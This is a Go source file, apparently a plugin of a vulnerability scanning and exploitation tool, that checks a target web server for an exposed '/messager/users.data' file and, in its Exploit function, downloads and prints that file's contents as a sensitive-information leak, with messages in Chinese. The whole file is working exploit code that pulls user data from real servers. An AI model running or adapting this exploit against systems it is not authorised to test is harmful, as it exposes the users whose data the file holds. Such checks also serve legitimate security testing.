package vulners

import (
	"github.com/fatih/color"
)

type Wc11 struct {
}

func (s *Wc11) Scan(targetUrl string) {
	vulnerable, err := Wc11scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Wc11] 存在users.data 敏感信息泄漏")
	} else {
		color.White("[Wc11] 不存在users.data 敏感信息泄漏")
	}
}

func (*Wc11) Exploit(targetUrl string) {
	runResult, err := Wc11runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Wc11scancore(targetUrl string) (bool, error) {
	url := "/messager/users.data"
	resp, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent := resp.String()
	if resContent != "" && resp.StatusCode == 200 {
		return true, nil
	} else {
		return false, nil
	}
}

func Wc11runcore(targetUrl string) (string, error) {
	url := "/messager/users.data"
	resp, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url)
	if err != nil {
		return "", err
	}
	resContent := resp.String()

	if resContent != "" && resp.StatusCode == 200 {
		return "存在users.data 敏感信息泄漏\n" + resContent, nil
	} else {
		return "", nil
	}
}
